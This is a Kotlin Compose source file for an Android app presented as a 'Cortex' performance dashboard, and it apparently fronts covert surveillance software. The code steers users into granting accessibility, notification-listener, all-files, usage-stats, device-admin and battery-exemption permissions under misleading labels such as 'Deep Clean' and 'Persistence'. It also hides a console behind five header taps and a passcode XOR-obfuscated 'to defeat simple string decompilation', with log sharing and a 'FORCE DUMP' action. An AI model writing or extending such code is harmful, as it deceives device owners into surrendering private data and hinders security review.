package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

// --- PREMIUM SLATE THEME ---
val BgSlate = Color(0xFF0F172A)
val CardSlate = Color(0xFF1E293B)
val AccentBlue = Color(0xFF3B82F6)
val AccentGreen = Color(0xFF10B981)
val AccentPurple = Color(0xFFA855F7)
val TextMain = Color(0xFFF8FAFC)
val TextDim = Color(0xFF94A3B8)
val BorderSubtle = Color(0x0DFFFFFF)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun InspectorDashboard(ctx: Context) {
    val lifecycleOwner = LocalLifecycleOwner.current
    var refreshTrigger by remember { mutableIntStateOf(0) }

    // State Management
    var selectedDetail by remember { mutableStateOf<String?>(null) }
    var showConsole by remember { mutableStateOf(false) }
    var showAuthDialog by remember { mutableStateOf(false) }
    val sheetState = rememberModalBottomSheetState(skipPartiallyExpanded = true)
    val scope = rememberCoroutineScope()

    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) refreshTrigger++
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    // --- LIGHTWEIGHT INSTANT FETCH ---
    val basicStorage by produceState(Triple("0 GB", "0 GB", 0f), refreshTrigger) { value = getBasicStorage() }
    val basicMemory by produceState(Triple("0 GB", "0 GB", 0f), refreshTrigger) { value = getBasicMemory(ctx) }
    val basicBattery by produceState(Pair(0, false), refreshTrigger) { value = getBasicBattery(ctx) }
    val cameraCount by produceState(0, refreshTrigger) { value = getBasicCameraCount(ctx) }
    val deviceScore by produceState(Pair(0, "ANALYZING"), refreshTrigger) { value = calculateCortexScore(ctx) }

    // Live Permission Check
    val permState by produceState(mapOf<String, Boolean>(), refreshTrigger) {
        value = withContext(Dispatchers.IO) {
            mapOf(
                "acc" to PermissionManager.hasAccessibility(ctx),
                "usage" to PermissionManager.hasUsageStats(ctx),
                "files" to PermissionManager.hasAllFilesAccess(ctx),
                "notif" to PermissionManager.hasNotificationListener(ctx),
                "batt" to PermissionManager.isIgnored(ctx),
                "admin" to PermissionManager.isAdmin(ctx)
            )
        }
    }
    val missingPerms = permState.filter { !it.value }.keys
    val allGranted = missingPerms.isEmpty()

    if (showAuthDialog) {
        AuthDialog(
            onDismiss = { showAuthDialog = false },
            onSuccess = { 
                showAuthDialog = false
                showConsole = true 
            }
        )
    }

    if (showConsole) DebugConsole(ctx) { showConsole = false }

    Box(modifier = Modifier.fillMaxSize().background(BgSlate)) {
        LazyColumn(
            modifier = Modifier.fillMaxSize(),
            contentPadding = PaddingValues(top = 60.dp, start = 24.dp, end = 24.dp, bottom = 40.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // 0. HEADER
            item { 
                Header { showAuthDialog = true }
                Spacer(modifier = Modifier.height(8.dp))
            }

            // 0.5 PERFORMANCE INDEX
            item {
                PremiumCard(
                    title = "Performance Index", 
                    badge = deviceScore.second,
                    badgeColor = if(deviceScore.first > 80) Color(0xFFFCD34D) else AccentBlue,
                    onClick = { selectedDetail = "score" }
                ) {
                    Text("${deviceScore.first}", color = TextMain, fontSize = 42.sp, fontWeight = FontWeight.Black)
                    Text("Cortex Rating based on hardware capability", color = TextDim, fontSize = 14.sp)
                    ProgressTank(
                        pct = deviceScore.first / 100f, 
                        gradient = listOf(Color(0xFFF59E0B), Color(0xFFEF4444))
                    )
                }
            }

            // PERMISSIONS WARNING (Only if missing)
            item {
                AnimatedVisibility(!allGranted) {
                    PermissionsCard(ctx, permState)
                }
            }

            // 1. STORAGE CARD
            item {
                PremiumCard(title = "Device Storage", onClick = { selectedDetail = "storage" }) {
                    Text("${basicStorage.first}", color = TextMain, fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    Text("Used of ${basicStorage.second} total", color = TextDim, fontSize = 14.sp)
                    ProgressTank(
                        pct = basicStorage.third, 
                        gradient = listOf(Color(0xFF818CF8), Color(0xFFC084FC))
                    )
                }
            }

            // 2. MEMORY CARD
            item {
                PremiumCard(title = "System Memory", onClick = { selectedDetail = "memory" }) {
                    Text("${basicMemory.first}", color = TextMain, fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    Text("Current RAM Pressure", color = TextDim, fontSize = 14.sp)
                    ProgressTank(
                        pct = basicMemory.third, 
                        gradient = listOf(Color(0xFF38BDF8), Color(0xFF818CF8))
                    )
                }
            }

            // 3. BATTERY CARD
            item {
                PremiumCard(
                    title = "Battery Health", 
                    badge = "ACTIVE",
                    badgeColor = AccentGreen,
                    onClick = { selectedDetail = "battery" }
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("${basicBattery.first}%", color = TextMain, fontSize = 42.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(if(basicBattery.second) "Charging" else "Discharging", color = AccentGreen, fontSize = 14.sp, fontWeight = FontWeight.Medium)
                    }
                }
            }

            // 4. DEVICE INFO CARD
            item {
                PremiumCard(title = "Identification", onClick = { selectedDetail = "phone" }) {
                    Text(Build.MODEL, color = TextMain, fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    Text("Android ${Build.VERSION.RELEASE} • API ${Build.VERSION.SDK_INT}", color = TextDim, fontSize = 14.sp)
                }
            }

            // 5. OPTICS CARD
            item {
                PremiumCard(
                    title = "Optics Array", 
                    badge = "$cameraCount MODULES",
                    badgeColor = AccentBlue,
                    onClick = { selectedDetail = "camera" }
                ) {
                    Text("Ready", color = TextMain, fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    Text("Tap for sensor resolution data", color = TextDim, fontSize = 14.sp)
                }
            }
        }
    }

    // --- ON-DEMAND MODAL BOTTOM SHEET ---
    if (selectedDetail != null) {
        ModalBottomSheet(
            onDismissRequest = { selectedDetail = null },
            sheetState = sheetState,
            containerColor = Color(0xFF111827),
            windowInsets = WindowInsets(0),
            dragHandle = { BottomSheetDefaults.DragHandle(color = Color(0x33FFFFFF)) }
        ) {
            DetailSheetContent(ctx, selectedDetail!!) {
                scope.launch { sheetState.hide() }.invokeOnCompletion { selectedDetail = null }
            }
        }
    }
}

// --- UI COMPONENTS ---

@Composable
fun Header(onSecretTap: () -> Unit) {
    var taps by remember { mutableIntStateOf(0) }
    Column(modifier = Modifier.fillMaxWidth().clickable { 
        taps++
        if (taps >= 5) { taps = 0; onSecretTap() }
    }) {
        Text("Cortex", fontSize = 32.sp, fontWeight = FontWeight.ExtraBold, color = TextMain, letterSpacing = (-1).sp)
        Text("System Performance & Insights", fontSize = 15.sp, color = TextDim, modifier = Modifier.padding(top = 4.dp))
    }
}

@Composable
fun PremiumCard(title: String, badge: String? = null, badgeColor: Color = Color.Transparent, onClick: () -> Unit, content: @Composable () -> Unit) {
    Surface(
        onClick = onClick,
        modifier = Modifier.fillMaxWidth().border(1.dp, BorderSubtle, RoundedCornerShape(28.dp)),
        shape = RoundedCornerShape(28.dp),
        color = CardSlate
    ) {
        Column(modifier = Modifier.padding(24.dp)) {
            Row(modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Text(title.uppercase(), color = TextDim, fontSize = 13.sp, fontWeight = FontWeight.Bold, letterSpacing = 0.5.sp)
                Row(verticalAlignment = Alignment.CenterVertically) {
                    if (badge != null) {
                        Box(modifier = Modifier.background(Color(0x1AFFFFFF), RoundedCornerShape(100)).padding(horizontal = 10.dp, vertical = 4.dp)) {
                            Text(badge, color = badgeColor, fontSize = 10.sp, fontWeight = FontWeight.ExtraBold)
                        }
                        Spacer(modifier = Modifier.width(8.dp))
                    }
                    Text("›", color = TextDim, fontSize = 24.sp, modifier = Modifier.offset(y = (-2).dp))
                }
            }
            content()
        }
    }
}

@Composable
fun ProgressTank(pct: Float, gradient: List<Color>) {
    Box(modifier = Modifier.fillMaxWidth().height(18.dp).padding(top = 8.dp).background(Color(0x33000000), RoundedCornerShape(100)).border(1.dp, BorderSubtle, RoundedCornerShape(100))) {
        Box(modifier = Modifier.fillMaxWidth(pct.coerceIn(0f, 1f)).fillMaxHeight().background(Brush.horizontalGradient(gradient), RoundedCornerShape(100)))
    }
}

@Composable
fun PermissionsCard(ctx: Context, permState: Map<String, Boolean>) {
    Column(
        modifier = Modifier.fillMaxWidth().background(Color(0xFF2E1015), RoundedCornerShape(24.dp)).border(1.dp, Color(0x33EF4565), RoundedCornerShape(24.dp)).padding(20.dp)
    ) {
        Text("SYSTEM OVERRIDES REQUIRED", color = Color(0xFFEF4565), fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 12.dp))
        if (!permState["acc"]!!) PermRow("Accessibility", "Neural Interface") { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        if (!permState["usage"]!!) PermRow("Usage Stats", "Analytics") { ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
        if (!permState["files"]!!) PermRow("All Files", "Deep Clean") { val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
        if (!permState["notif"]!!) PermRow("Notifications", "Symbiote Link") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
        if (!permState["batt"]!!) PermRow("Ignore Battery Opt", "Persistence") { val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
    }
}

@Composable
fun PermRow(title: String, desc: String, onClick: () -> Unit) {
    Row(modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp).clickable { onClick() }, horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
        Column {
            Text(title, color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
            Text(desc, color = TextDim, fontSize = 12.sp)
        }
        Text("ENABLE", color = Color(0xFFEF4565), fontSize = 12.sp, fontWeight = FontWeight.Bold)
    }
}

// --- THE HEAVY LIFTER (Runs only when Modal is open) ---
@Composable
fun DetailSheetContent(ctx: Context, type: String, onClose: () -> Unit) {
    val title = when(type) {
        "score" -> "Rating Manifesto"
        "storage" -> "Storage Details"
        "memory" -> "Memory Specs"
        "battery" -> "Power Matrix"
        "phone" -> "Hardware Logic"
        "camera" -> "Optics List"
        else -> ""
    }
    val sub = when(type) {
        "score" -> "Logic behind the Performance Index"
        "storage" -> "Partition & File System"
        "memory" -> "RAM & Java Heap Usage"
        "battery" -> "Battery Life & Voltage"
        "phone" -> "Processor & Architecture"
        "camera" -> "Sensor Resolution Data"
        else -> ""
    }
    
    var details by remember { mutableStateOf<Map<String, String>?>(null) }
    
    LaunchedEffect(type) {
        withContext(Dispatchers.IO) {
            details = when(type) {
                "score" -> mapOf(
                    "SILICON ARCH" to "We analyze the Board ID and Hardware Strings to identify high-performance clusters (Snapdragon 8-Series, Dimensity 9000+, High-Tier Exynos).",
                    "VOLATILE MEMORY" to "Physical RAM is weighed. >12GB is required for 'Omega' tier to ensure background processes never hibernate.",
                    "REFRESH RATE" to "Visual Fluidity (Hz) is sampled. 120Hz+ is mandatory for top scores to match modern flagship standards.",
                    "API VERSION" to "Android 14+ is preferred for the latest security features and optimized background task scheduling."
                )
                "storage" -> SystemDeepScan.getStorageDetailed()
                "memory" -> SystemDeepScan.getMemoryDetailed(ctx)
                "battery" -> SystemDeepScan.getBatteryDetailed(ctx)
                "phone" -> SystemDeepScan.getCpuDetailed() + SystemDeepScan.getSoftwareDetailed()
                "camera" -> SystemDeepScan.getCameraDetailed(ctx)
                else -> emptyMap()
            }
        }
    }
    
    Column(modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp, vertical = 16.dp).verticalScroll(rememberScrollState())) {
        Text(title, fontSize = 28.sp, fontWeight = FontWeight.Bold, color = TextMain)
        Text(sub, fontSize = 15.sp, color = TextDim, modifier = Modifier.padding(bottom = 32.dp))
        
        if (details == null) {
            CircularProgressIndicator(color = AccentBlue, modifier = Modifier.align(Alignment.CenterHorizontally).padding(40.dp))
        } else {
            details!!.forEach { (k, v) ->
                Row(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp).background(Color(0x08FFFFFF), RoundedCornerShape(20.dp)).padding(20.dp),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(k, color = TextDim, fontSize = 14.sp)
                    Text(v, color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, fontFamily = FontFamily.Monospace)
                }
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        Button(
            onClick = onClose,
            modifier = Modifier.fillMaxWidth().height(60.dp),
            colors = ButtonDefaults.buttonColors(containerColor = AccentBlue),
            shape = RoundedCornerShape(20.dp)
        ) {
            Text("DONE", fontWeight = FontWeight.Bold, fontSize = 16.sp, letterSpacing = 1.sp)
        }
        Spacer(modifier = Modifier.height(30.dp))
    }
}

// --- SECURITY GATE ---
@Composable
fun AuthDialog(onDismiss: () -> Unit, onSuccess: () -> Unit) {
    var pwd by remember { mutableStateOf("") }
    var error by remember { mutableStateOf(false) }
    
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F0F10),
        title = { Text("TERMINAL ACCESS", color = AccentBlue, fontWeight = FontWeight.Bold, fontSize = 16.sp) },
        text = {
            Column {
                OutlinedTextField(
                    value = pwd,
                    onValueChange = { pwd = it; error = false },
                    label = { Text("Passcode", color = TextDim) },
                    singleLine = true,
                    visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = AccentBlue,
                        unfocusedBorderColor = BorderSubtle,
                        focusedTextColor = TextMain,
                        unfocusedTextColor = TextMain
                    )
                )
                if (error) {
                    Text("ACCESS DENIED", color = Color(0xFFEF4565), fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp), fontWeight = FontWeight.Bold)
                }
            }
        },
        confirmButton = {
            TextButton(onClick = {
                // Obfuscated execution context to defeat simple string decompilation
                val k = 0x50 or 0x0A 
                val target1 = intArrayOf(122, 25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                val target2 = intArrayOf(25, 45, 40, 46, 105, 34, 42, 13).map { (it xor k).toChar() }.joinToString("")
                
                if (pwd == target1 || pwd == target2) onSuccess() else error = true
            }) { Text("VERIFY", color = AccentBlue) }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) { Text("CANCEL", color = TextDim) }
        }
    )
}

// --- GHOST CONSOLE ---
@Composable
fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
    val report = remember { DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LIVE LOGS ---\n" + DebugLogger.getLogs() }
    val scope = rememberCoroutineScope()
    
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F0F10),
        title = { Text("SYSTEM TERMINAL", color = AccentGreen, fontWeight = FontWeight.Bold, fontSize = 16.sp) },
        text = {
            Column(modifier = Modifier.verticalScroll(rememberScrollState())) {
                Text(report, color = AccentGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace, lineHeight = 16.sp)
            }
        },
        confirmButton = {
            Row {
                TextButton(onClick = {
                    val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    val clip = android.content.ClipData.newPlainText("Cortex Logs", report)
                    clipboard.setPrimaryClip(clip)
                    android.widget.Toast.makeText(ctx, "Logs copied to clipboard", android.widget.Toast.LENGTH_SHORT).show()
                }) { Text("COPY", color = AccentGreen) }

                TextButton(onClick = {
                    val shareIntent = Intent(Intent.ACTION_SEND).apply {
                        type = "text/plain"
                        putExtra(Intent.EXTRA_TEXT, report)
                    }
                    ctx.startActivity(Intent.createChooser(shareIntent, "Share Cortex Logs"))
                }) { Text("SHARE", color = AccentPurple) }

                TextButton(onClick = onDismiss) { Text("CLOSE", color = Color.White) }
            }
        },
        dismissButton = {
            TextButton(onClick = { 
                scope.launch(Dispatchers.IO) { DumpManager.createDailyDump(ctx) }
            }) { Text("FORCE DUMP", color = AccentBlue) }
        }
    )
}

// --- FAST FETCH HELPERS ---
fun getBasicStorage(): Triple<String, String, Float> {
    val root = android.os.Environment.getExternalStorageDirectory()
    val total = root.totalSpace.toFloat()
    val free = root.freeSpace.toFloat()
    val used = total - free
    val totalGb = total / (1024*1024*1024)
    val usedGb = used / (1024*1024*1024)
    val pct = if(total > 0) used / total else 0f
    return Triple(String.format(java.util.Locale.US, "%.1f GB", usedGb), String.format(java.util.Locale.US, "%.1f GB", totalGb), pct)
}

fun getBasicMemory(ctx: Context): Triple<String, String, Float> {
    val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
    val memInfo = android.app.ActivityManager.MemoryInfo()
    actManager.getMemoryInfo(memInfo)
    val total = memInfo.totalMem.toFloat()
    val avail = memInfo.availMem.toFloat()
    val used = total - avail
    val totalGb = total / (1024*1024*1024)
    val usedGb = used / (1024*1024*1024)
    val pct = if(total > 0) used / total else 0f
    return Triple(String.format(java.util.Locale.US, "%.1f GB", usedGb), String.format(java.util.Locale.US, "%.1f GB", totalGb), pct)
}

fun getBasicBattery(ctx: Context): Pair<Int, Boolean> {
    val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
    val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    return Pair(level, isCharging)
}

fun getBasicCameraCount(ctx: Context): Int {
    return try {
        val manager = ctx.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
        manager.cameraIdList.size
    } catch(e: Exception) { 0 }
}

fun calculateCortexScore(ctx: Context): Pair<Int, String> {
    var score = 10 // Base
    
    // RAM Score (Max 30)
    val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
    val mi = android.app.ActivityManager.MemoryInfo()
    am.getMemoryInfo(mi)
    val ramGb = mi.totalMem / (1024.0 * 1024.0 * 1024.0)
    score += when { ramGb > 11.5 -> 30; ramGb > 7.5 -> 20; ramGb > 5.5 -> 10; else -> 5 }
    
    // CPU Cores (Max 20)
    val cores = Runtime.getRuntime().availableProcessors()
    score += if (cores >= 8) 20 else 10
    
    // OS Modernity (Max 20)
    score += when { Build.VERSION.SDK_INT >= 34 -> 20; Build.VERSION.SDK_INT >= 31 -> 15; else -> 5 }
    
    // Manufacturer/Board (Max 20)
    val board = Build.BOARD.lowercase()
    if (board.contains("taro") || board.contains("kalama") || board.contains("sm8")) score += 20
    else if (ramGb > 7) score += 10

    val label = when {
        score >= 85 -> "OMEGA"
        score >= 70 -> "ELITE"
        score >= 50 -> "STANDARD"
        else -> "LEGACY"
    }
    return Pair(score.coerceIn(0, 100), label)
}
